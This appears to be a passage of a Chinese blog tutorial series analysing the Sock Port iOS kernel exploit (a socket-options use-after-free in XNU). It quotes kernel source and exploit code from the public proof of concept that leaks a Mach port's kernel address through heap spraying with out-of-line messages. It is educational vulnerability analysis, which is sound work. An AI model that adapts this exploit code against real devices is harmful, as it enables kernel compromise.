<span class="keyword">ipc_object_t</span>		*objectp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ipc_entry_t</span> entry;</span><br><span class="line">    <span class="keyword">ipc_port_t</span> soright;</span><br><span class="line">    <span class="keyword">ipc_port_t</span> release_port;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr;</span><br><span class="line">    <span class="keyword">int</span> assertcnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. find port in is_table</span></span><br><span class="line">    kr = ipc_right_lookup_write(space, name, &amp;entry);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS)</span><br><span class="line">        <span class="keyword">return</span> kr;</span><br><span class="line">    </span><br><span class="line">    release_port = IP_NULL;</span><br><span class="line">    <span class="comment">// 2. copy to kernel ipc_object</span></span><br><span class="line">    kr = ipc_right_copyin(space, name, entry,</span><br><span class="line">    		      msgt_name, TRUE,</span><br><span class="line">    		      objectp, &amp;soright,</span><br><span class="line">    		      &amp;release_port,</span><br><span class="line">    		      &amp;assertcnt);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> kr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要有两个关键步骤：</p>
<ol>
<li>在当前 IPC Space 的 port 索引表中根据 port_name 获取到 port address；</li>
<li>将 port right 拷贝到内核中的 ipc_object 对象返回。</li>
</ol>
<p>这里的关键是第 1 步，它通过 <code>ipc_right_lookup_write</code> 实现了句柄到地址的转换，它是对 <code>ipc_entry_lookup</code> 的封装，我们直接看后者的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ipc_entry_t</span></span><br><span class="line">ipc_entry_lookup(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	name)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_port_index_t</span> index;</span><br><span class="line">    <span class="keyword">ipc_entry_t</span> entry;</span><br><span class="line">    </span><br><span class="line">    assert(is_active(space));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. get index from port name</span></span><br><span class="line">    index = name &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (index &lt;  space-&gt;is_table_size) &#123;</span><br><span class="line">        <span class="comment">// 2. get port address by index from is_table</span></span><br><span class="line">        entry = &amp;space-&gt;is_table[index];</span><br><span class="line">    	<span class="keyword">if</span> (IE_BITS_GEN(entry-&gt;ie_bits) != MACH_PORT_GEN(name) ||</span><br><span class="line">    	    IE_BITS_TYPE(entry-&gt;ie_bits) == MACH_PORT_TYPE_NONE) &#123;</span><br><span class="line">    		entry = IE_NULL;		</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	entry = IE_NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    assert((entry == IE_NULL) || IE_BITS_TYPE(entry-&gt;ie_bits));</span><br><span class="line">    <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这里我们可以看到，port 句柄中的索引信息是从第 8 位开始的，因此将 port name 右移 8 位即可得到 port index，随后在索引表中查找地址返回。</p>
<p>到这里我们已经全然明白了为何能通过发送 Mach OOL Message 实现迫使内核分配指定 port 的 <code>ipc_port pointers</code> 的原理，接下来我们着手分析如何获取到这个地址。</p>
<h1 id="通过-OOL-Message-与-Socket-UAF-获取-Port-Address"><a href="#通过-OOL-Message-与-Socket-UAF-获取-Port-Address" class="headerlink" title="通过 OOL Message 与 Socket UAF 获取 Port Address"></a>通过 OOL Message 与 Socket UAF 获取 Port Address</h1><p>到这里思路变得十分明确，我们只需要利用 Socket UAF 得到一块已释放区域，然后发送大量的 OOL Message 消息，且使得 port 数组与被释放区域大小一致，即可通过 Heap Spraying 将 <code>ipc_port pointer</code> 数组分配在已释放区域，下面我们来看 Sock Port 中的这段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// first primitive: leak the kernel address of a mach port</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">find_port_via_uaf</span><span class="params">(<span class="keyword">mach_port_t</span> port, <span class="keyword">int</span> disposition)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// here we use the uaf as an info leak</span></span><br><span class="line">    <span class="comment">// 1. make dangling socket option zone</span></span><br><span class="line">    <span class="keyword">int</span> sock = get_socket_with_dangling_options();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. send ool message</span></span><br><span class="line">        <span class="keyword">mach_port_t</span> p = fill_kalloc_with_port_pointer(port, <span class="number">192</span>/<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), MACH_MSG_TYPE_COPY_SEND);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> mtu;</span><br><span class="line">        <span class="keyword">int</span> pref;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. get option and check if it is a kernel pointer</span></span><br><span class="line">        get_minmtu(sock, &amp;mtu); <span class="comment">// this is like doing rk32(options + 180);</span></span><br><span class="line">        get_prefertempaddr(sock, &amp;pref); <span class="comment">// this like rk32(options + 184);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*  from a hex dump:</span></span><br><span class="line"><span class="comment">         </span></span><br><span class="line"><span class="comment">         (lldb) p/x HexDump(options, 192)</span></span><br><span class="line"><span class="comment">         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................</span></span><br><span class="line"><span class="comment">         ...</span></span><br><span class="line"><span class="comment">         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................</span></span><br><span class="line"><span class="comment">                    |-----------||-----------|</span></span><br><span class="line"><span class="comment">                     minmtu here prefertempaddr here</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">uint64_t</span> ptr = (((<span class="keyword">uint64_t</span>)mtu &lt;&lt; <span class="number">32</span>) &amp; <span class="number">0xffffffff00000000</span>) | ((<span class="keyword">uint64_t</span>)pref &amp; <span class="number">0x00000000ffffffff</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (mtu &gt;= <span class="number">0xffffff00</span> &amp;&amp; mtu != <span class="number">0xffffffff</span> &amp;&amp; pref != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            mach_port_destroy(mach_task_self(), p);</span><br><span class="line">            <span class="built_in">close</span>(sock);</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        mach_port_destroy(mach_task_self(), p);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// close that socket.</span></span><br><span class="line">    <span class="built_in">close</span>(sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有 4 个关键步骤：</p>
<ol>
<li>利用 Socket UAF 制造一个 <code>in6p_outputopts</code> 大小的已释放区域，详细过程可以看上一篇文章：<a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a> 或 <a href="https://github.com/jakeajames/sock_port/blob/master/sock_port.pdf" target="_blank" rel="noopener">Sock Port Write-up</a>；</li>
<li>发送 ool message，由于 <code>in6p_outputopts</code> 的大小为 192B，一个 port pointer 大小为 8B，因此我们需要发送 192 / 8 = 24 个 ool_ports；</li>
<li>通过 <code>in6p_outputopts</code> 两个连续的成员变量拼接出一个 64 位地址；</li>
<li>判断步骤 3 中得到的地址是否是内核对象指针，如果是内核对象指针，说明我们成功了，该地址就是 target port 的地址。</li>
</ol>
<p>这里我们重点讲一下第 3、4 步：</p>
<h2 id="通过-Socket-Option-读取一个-8B-区域"><a href="#通过-Socket-Option-读取一个-8B-区域" class="headerlink" title="通过 Socket Option 读取一个 8B 区域"></a>通过 Socket Option 读取一个 8B 区域</h2><p>根据 <code>in6p_outputopts</code> 对应的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>	<span class="title">ip6_pktopts</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">ip6po_m</span>;</span>	</span><br><span class="line">    <span class="keyword">int</span>	        ip6po_hlim;	</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">in6_pktinfo</span> *<span class="title">ip6po_pktinfo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6po_nhinfo</span> <span class="title">ip6po_nhinfo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6_hbh</span> *<span class="title">ip6po_hbh</span>;</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6_dest</span> *<span class="title">ip6po_dest1</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6po_rhinfo</span> <span class="title">ip6po_rhinfo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6_dest</span> *<span class="title">ip6po_dest2</span>;</span></span><br><span class="line">    <span class="keyword">int</span>	ip6po_tclass;</span><br><span class="line">    <span class="keyword">int</span>	ip6po_minmtu; <span class="comment">// +180</span></span><br><span class="line">    <span class="keyword">int</span>	ip6po_prefer_tempaddr; <span class="comment">// + 184</span></span><br><span class="line">    <span class="keyword">int</span> ip6po_flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>minmtu</code> 和 <code>ip6po_prefer_tempaddr</code> 分别位于该结构体的 +180 和 +184 区域，由于每个 pointer 是 8B，最近的 pointer 位于 +176 ~ +184 和 +184 ~ + 192 区域，因此通过 <code>minmtu</code> 我们能读到前一个 pointer 的高 32 位，通过 <code>ip6po_prefer_tempaddr</code> 能读到下一个指针的低 32 位，又因为 Heap Spraying 成功后这些 pointer 都是指向 target ipc_port 的，所以我们可以用他们拼接出一个完整的 pointer address，拼接方法是将 <code>minmtu</code> 左移 32 位或上 <code>ip6po_prefer_tempaddr</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> ptr = (((<span class="keyword">uint64_t</span>)mtu &lt;&lt; <span class="number">32</span>) &amp; <span class="number">0xffffffff00000000</span>) | ((<span class="keyword">uint64_t</span>)pref &amp; <span class="number">0x00000000ffffffff</span>);</span><br></pre></td></tr></table></figure>

<h2 id="判断是否是内核对象指针的地址"><a href="#判断是否是内核对象指针的地址" class="headerlink" title="判断是否是内核对象指针的地址"></a>判断是否是内核对象指针的地址</h2><p>下面最关键的步骤是如何判断这是一个有效地内核地址，这里需要两个基础知识：</p>
<ol>
<li>如果内存中的内容是 0xdeadbeef，则说明这块区域尚未完成初始化[3]；</li>
<li>根据 XNU 中 <code>mach/arm/vm_param.h</code> 中的定义，内核地址的有效范围是从 0xffffffe000000000 ~ 0xfffffff3ffffffff，一般而言 port address 的高 32 位是 0xffffffe。</li>
</ol>
<p>综合以上两点有以下判断代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mtu &gt;= <span class="number">0xffffff00</span> &amp;&amp; mtu != <span class="number">0xffffffff</span> &amp;&amp; pref != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">    mach_port_destroy(mach_task_self(), p);</span><br><span class="line">    <span class="built_in">close</span>(sock);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果满足条件，此时我们已经拿到了 port address。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文先介绍了 Mach port 的用户空间与内核空间表示及其功能；随后简单介绍了 Sock Port 的实现机理；接着以漏洞的第一个关键点（通过 OOL Message 泄露 Port Addr）为切入点，结合 XNU 源码深入分析了 OOL Message 实现 ipc_port pointers Spraying 的原理；最后结合 Sock Port 源码分析了拿到 Port Address 的过程。</p>
<p>通过这一节的学习，相信你对 Mach port 的整套机制和 Heap Spraying 有了更加深入的认识。</p>
<h1 id="下节预告"><a href="#下节预告" class="headerlink" title="下节预告"></a>下节预告</h1><p>通过 Socket UAF 不仅能实现泄露 Port Address，还能实现任意地址的读取和任意内核 zone 的释放。在下一节中，我们将介绍基于 IOSurface 的 Heap Spraying 与 Socket UAF 组合来实现上述 Primitives 的原理和过程。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://robert.sesek.com/2012/1/debugging_mach_ports.html" target="_blank" rel="noopener">Debugging Mach Ports. Robert Sesek</a></li>
<li><a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html" target="_blank" rel="noopener">Mach Overview - Tasks and Threads. Apple</a></li>
<li><a href="https://en.wikipedia.org/wiki/Hexspeak" target="_blank" rel="noopener">Hexspeak. Wikipedia</a></li>
<li><a href="https://www.gnu.org/software/hurd/gnumach-doc/Memory.html" target="_blank" rel="noopener">GNU Doc - Memory</a></li>
<li><a href="https://paper.seebug.org/800/" target="_blank" rel="noopener">IPC Voucher UaF Remote Jailbreak Stage 2. Qixun Zhao</a></li>
<li><a href="https://github.com/jakeajames/sock_port" target="_blank" rel="noopener">Sock Port 2 on GitHub</a></li>
<li><a href="https://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/" target="_blank" rel="noopener">CVE-2016-7637—再谈Mach IPC. turing.huang</a></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/17/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89UAF-%E4%B8%8E-Heap-Spraying/">Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-17</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/SockPort/">SockPort</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/UAF/">UAF</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Heap-Spraying/">Heap Spraying</a></span><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在之前的汇编教程系列文章中，我们在用户态下探讨了诸多原理。从今天开始，我们将详细分析历代 iOS Jailbreak Exploits，并由此深入 XNU 内核，并学习更多二进制安全攻防的知识。</p>
<p>虽然国外大佬提供的 Exploit PoC 都有较为详细的 write-up，但这些 write-up 常常以之前出现的 PoC 为基础，并不详细展开某些具体原理，这就导致初学者很难完全读懂。笔者的 Jailbreak Priciples 系列文章会将所有相关的 PoC 和 write-up 进行整合，并以读者是内核小白（其实笔者也是）为假设展开分析，目标是打造人人能读懂的 XNU 漏洞分析系列文章。</p>
<h1 id="越狱的本质"><a href="#越狱的本质" class="headerlink" title="越狱的本质"></a>越狱的本质</h1><p>iOS 仅为用户提供了一个受限的 Unix 环境，常规情况下我们只能在用户态借助于合法的系统调用来与内核交互。相反的，用于电脑的 macOS 则有着很高的自由度。它们都基于 Darwin-XNU，但 Apple 在 iPhoneOS 上施加了诸多限制，越狱即解除这些限制使我们可以获得 iPhoneOS 的 root 权限，进而在一定程度上为所欲为。</p>
<p>Apple 采用了 Sandbox, Signature Checkpoints 等手段对系统进行保护，使得突破这些限制变得极为困难。</p>
<h1 id="越狱的分类"><a href="#越狱的分类" class="headerlink" title="越狱的分类"></a>越狱的分类</h1><p>目前越狱主要分为两类，一类是以硬件漏洞为基础的 BootROM Exploit，另一类则是基于软件漏洞的 Userland Exploit。</p>
<h2 id="BootROM-Exploit"><a href="#BootROM-Exploit" class="headerlink" title="BootROM Exploit"></a>BootROM Exploit</h2><p>这类漏洞类似于单片机中的 IC 解密，从硬件层面发现 iPhone 本身的漏洞，使得整个系统的 <a href="https://www.theiphonewiki.com/wiki/Bootchain" target="_blank" rel="noopener">Secure Boot Chain</a> 变得不可靠，这类漏洞的杀伤力极强，只能通过更新硬件解决。最近出现的 <a href="https://github.com/axi0mX/ipwndfu" target="_blank" rel="noopener">checkm8</a> 及基于它开发的 <a href="https://checkra.in/" target="_blank" rel="noopener">checkra1n</a> 就实现了 iPhone 5s ~ iPhone X 系列机型的硬件调试与越狱；</p>
<h2 id="Userland-Exploit"><a href="#Userland-Exploit" class="headerlink" title="Userland Exploit"></a>Userland Exploit</h2><p>这类漏洞往往是对开源的 <a href="https://github.com/apple/darwin-xnu" target="_blank" rel="noopener">Darwin-XNU</a> 进行代码审计发现的，基于这些漏洞往往能使我们在用户态将任意可执行代码送入内核执行，我们即将介绍的 Sock Port Exploit 即是对 XNU 中 socket options 的一个 UAF 漏洞的利用。</p>
<h1 id="将用户态数据送入内核"><a href="#将用户态数据送入内核" class="headerlink" title="将用户态数据送入内核"></a>将用户态数据送入内核</h1><p>通过上文的分析我们知道，Userland Exploit 的一个重要基础是能将任意数据写入内核的堆区，使之成为有效地 Kernel 数据结构，进而从用户态实施对内核的非法控制。遗憾的是，我们无法直接操作内核的内存数据，这是因为用户态的应用程序没有办法获取 kernel_task，也就无法直接通过 <code>vm_read</code> 和 <code>vm_write</code> 等函数操作内核的堆栈。</p>
<p>既然无法直接操作内存，我们就需要考虑间接操作内存的方式，事实上我们有非常多的方式能够间接读写内核的数据，最常见方式有 Socket, Mach Message 和 IOSurface 等，这里我们先介绍最好理解的 Socket 方式，随后对 Sock Port 的漏洞时分析会介绍其利用这三种方式打的组合拳。</p>
<h2 id="基于-Socket-的间接内核内存读写"><a href="#基于-Socket-的间接内核内存读写" class="headerlink" title="基于 Socket 的间接内核内存读写"></a>基于 Socket 的间接内核内存读写</h2><p>由于 Socket 的实现是操作系统层面的，在用户态通过 socket 函数创建 sock 时内核会执行一些内存分配操作，例如下面的用户态代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br></pre></td></tr></table></figure>

<p>在内核态会根据传入的参数创建 <code>struct socket</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel structure per socket.</span></span><br><span class="line"><span class="comment"> * Contains send and receive buffer queues,</span></span><br><span class="line"><span class="comment"> * handle on protocol and pointer to protocol</span></span><br><span class="line"><span class="comment"> * private data and error information.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	so_zone;		<span class="comment">/* zone we were allocated from */</span></span><br><span class="line">	short	so_type;		<span class="comment">/* generic type, see socket.h */</span></span><br><span class="line">	u_short	so_error;		<span class="comment">/* error affecting connection */</span></span><br><span class="line">	<span class="keyword">u_int32_t</span> so_options;		<span class="comment">/* from socket call, see socket.h */</span></span><br><span class="line">	short	so_linger;		<span class="comment">/* time to linger while closing */</span></span><br><span class="line">	short	so_state;		<span class="comment">/* internal state flags SS_*, below */</span></span><br><span class="line">	<span class="keyword">void</span>	*so_pcb;		<span class="comment">/* protocol control block */</span></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们能通过传入 socket 的参数间接、受限的控制内核中的内存，但由于系统只会返回 sock 的句柄（handle）给我们，我们无法直接读取内核的内存内容。</p>
<p>要读取内核的内存，我们可以借助于内核提供的 socket options 相关函数，他们能够修改 socket 的一些配置，例如下面的代码修改了 IPV6 下的 Maximum Transmission Unit：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set mtu</span></span><br><span class="line"><span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(*minmtu));</span><br><span class="line"></span><br><span class="line"><span class="comment">// read mtu</span></span><br><span class="line">getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(*minmtu));</span><br></pre></td></tr></table></figure>

<p>在内核态，系统会读取 <code>struct socket</code> 的 so_pcb，并执行来自用户态的读写操作，由此我们透过 options 相关函数读写了内核中 socket 结构体的部分内容。</p>
<h2 id="利用-Socket-读写内核的任意内容"><a href="#利用-Socket-读写内核的任意内容" class="headerlink" title="利用 Socket 读写内核的任意内容"></a>利用 Socket 读写内核的任意内容</h2><p>上述方式有一个明显的限制，那就是我们只能在内核受控的范围内读写内存，单单通过这种方式是玩不出幺蛾子的。设想如果我们能尝试把一个伪造的 Socket 结构体分配到内核的其他区段，是不是就能通过 <code>setsockopt</code> 和 <code>getsockopt</code> 来读写任意内存了呢？</p>
<p>Sock Port 是一个利用 Socket 函数集实现内核内存任意读写的漏洞，它主要基于 iOS 10.0 - 12.2 的内核代码中 socket disconnect 时的一个漏洞，观察如下的内核代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">	inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		m_freem(inp-&gt;in6p_options);</span><br><span class="line">		inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">	&#125;</span><br><span class="line">	ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad</span></span><br><span class="line">	ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">	<span class="comment">/* free IPv4 related resources in case of mapped addr */</span></span><br><span class="line">	<span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		(<span class="keyword">void</span>) m_free(inp-&gt;inp_options); </span><br><span class="line">		inp-&gt;inp_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在清理 options 时只对 <code>in6p_outputopts</code> 进行了释放，而没有清理 <code>in6p_outputopts</code> 指针的地址，这就造成了一个 <code>in6p_outputopts</code> 悬垂指针。</p>
<p>幸运的是，通过某种设置后，我们能够在 socket disconnect 后继续通过 <code>setsockopt</code> 和 <code>getsockopt</code> 间接读写这个悬垂指针。随着系统重新分配这块内存，我们依然能够通过悬垂指针对其进行访问，因此问题转化为了如何间接控制系统对该区域的 Reallocation。</p>
<p>这类透过悬垂指针操作已释放区域的漏洞被称为 UAF（Use After Free），而间接控制系统 Reallocation 的常见方式有 <a href="https://en.wikipedia.org/wiki/Heap_spraying" target="_blank" rel="noopener">堆喷射(Heap Spraying)</a> 和 <a href="https://en.wikipedia.org/wiki/Heap_feng_shui" target="_blank" rel="noopener">堆风水(Heap feng-shui)</a>，整个 Sock Port 的漏洞利用较为复杂，我们将在接下来的几篇文章中逐步讲解，这里只需要对这些概念有个初步的认识即可。</p>
<h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>透过上述例子我们对 UAF 有了一个初步的认识，现在我们参考 Webopedia 给出明确的定义：</p>
<blockquote>
<p>Use After Free specifically refers to the attempt to access memory after it has been freed, which can cause a program to crash or, in the case of a Use-After-Free flaw, can potentially result in the execution of arbitrary code or even enable full remote code execution capabilities.</p>
</blockquote>
<p>即尝试访问已释放的内存，这会导致程序崩溃，或是潜在的任意代码执行，甚至获取完全的远程控制能力。</p>
<p>UAF 的关键之一是获取被释放区域的内存地址，一般透过悬垂指针实现，而悬垂指针是由于指针指向的内存区域被释放，但指针未被清零导致的，这类问题在缺乏二进制安全知识的开发者写出的代码中屡见不鲜。</p>
<p>对于跨进程的情况下，只透过悬垂指针是无法读写执行内存的，需要配合一些能间接读取悬垂指针的 IPC 函数，例如上文中提到的 <code>setsockopt</code> 和 <code>getsockopt</code>，此外为了有效地控制 Reallocation 往往需要结合间接操作堆的相关技术。</p>
<h1 id="Heap-Spraying"><a href="#Heap-Spraying" class="headerlink" title="Heap Spraying"></a>Heap Spraying</h1><p>下面我们参考 Computer Hope 给出 Heap Spraying 的定义：</p>
<blockquote>
<p>Heap spraying is a technique used to aid the exploitation of vulnerabilities in computer systems. It is called “spraying the heap” because it involves writing a series of bytes at various places in the heap. The heap is a large pool of memory that is allocated for use by programs. The basic idea is similar to spray painting a wall to make it all the same color. Like a wall, the heap is “sprayed” so that its “color” (the bytes it contains) is uniformly distributed over its entire memory “surface.”</p>
</blockquote>
